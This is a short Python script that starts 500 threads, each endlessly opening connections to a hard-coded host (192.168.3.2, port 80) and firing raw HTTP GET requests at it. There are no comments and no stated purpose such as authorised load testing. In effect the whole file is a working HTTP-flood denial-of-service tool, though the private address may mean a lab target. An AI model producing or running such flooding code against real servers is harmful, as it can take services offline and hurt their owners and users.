import socket
import threading

host = '192.168.3.2'
port = 80

num_threads = 500


def send_raw_http_request():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            http_request = "GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(
                host)
            s.sendall(http_request.encode())
            response = s.recv(4096)
            s.close()
        except Exception as e:
            print(f"Error: {e}")


threads = []
for _ in range(num_threads):
    t = threading.Thread(target=send_raw_http_request)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()
